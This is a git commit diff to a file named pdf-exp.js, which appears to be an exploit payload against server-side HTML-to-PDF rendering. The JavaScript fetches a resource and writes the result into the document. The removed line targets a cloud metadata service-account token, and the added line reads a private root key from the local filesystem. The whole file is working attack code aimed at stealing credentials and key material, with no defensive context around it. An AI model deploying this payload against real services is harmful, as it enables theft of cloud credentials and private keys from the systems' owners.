9e2f09c0fa96b67bace4cbfbc3f0ddcd42390aa4
gururaj359 <44290477+gururaj359@users.noreply.github.com>
2023-09-21 13:11:01 +0530

    Update pdf-exp.js

--- pdf-exp.js
+++ pdf-exp.js
@@ -1,5 +1,5 @@
 http = new XMLHttpRequest();
 http.onload = function(){document.write(this.responseText);}
 http.onerror = function(){document.write('failed!')}
-http.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token");
+http.open("GET","file:///home/certs/root.key");
 http.send();
